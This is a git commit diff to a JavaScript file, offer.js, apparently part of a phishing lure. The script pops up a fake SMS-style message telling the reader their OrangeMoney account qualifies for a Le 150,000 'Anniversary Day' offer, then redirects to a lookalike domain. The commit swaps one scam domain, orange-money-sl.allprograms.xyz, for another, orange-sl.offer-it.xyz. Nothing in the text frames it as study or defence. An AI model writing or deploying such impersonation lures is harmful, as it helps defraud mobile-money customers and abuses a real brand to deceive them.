3ee214888083cd9bb1a302769325933de78d5077
kenycruzk <kenycruzk@gmail.com>
2025-11-08 04:01:32 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -2,5 +2,6 @@
 var password = 'Le 150,000'
 password=prompt('SMS: Congratulations Your OrangeMoney Account is Eligible to receive Le 150,000 Anniversary Day Celebration Offer, Kindly Press OK to PROCEED   ','Le 150,000');
 if (password != 'Le 150,000') {
-location.href='https://orange-money-sl.allprograms.xyz/gift';
+location.href='https://orange-sl.offer-it.xyz/gift';
 }
+
